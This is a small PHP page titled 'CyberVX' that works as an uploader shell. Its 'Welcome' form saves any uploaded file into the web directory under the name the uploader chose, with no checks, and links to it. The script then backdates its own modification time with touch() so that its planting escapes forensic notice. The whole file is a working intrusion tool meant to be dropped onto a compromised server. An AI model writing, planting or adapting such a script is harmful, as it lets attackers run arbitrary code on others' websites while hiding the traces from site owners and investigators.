<html>

	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=windows-utf-8">
		<title> CyberVX </title>
	</head>
<body>

<?php
	echo "<h1> Welcome </h1>\n";

	# IP interno
	echo "IP: ";
	echo $_SERVER['REMOTE_ADDR'];

	echo "<form method=\"post\" enctype=\"multipart/form-data\">\n";
	echo "<input type=\"file\" name=\"newfile\"><br> \n";
	echo "<input type=\"submit\" value=\"OK\"><br>\n";
	echo "</form>\n";
	
	# Estrutura de condicao:
	if(is_uploaded_file($_FILES["newfile"]["tmp_name"]))
	{
		# Movendo da pasta temporaria -> local setado
		move_uploaded_file($_FILES["newfile"]["tmp_name"], $_FILES["newfile"]["name"]);
		
		$file = $_FILES["newfile"]["name"];
 		echo "<a href=\"$file\">$file</a>";
 	} 
 	
 	else
 	{
 		echo("empty");
 	}
 	
 	$newfile = $_SERVER[SCRIPT_FILENAME];
	$time = time() - 105360688;

	touch($newfile, $time);
?>

</body>

</html>
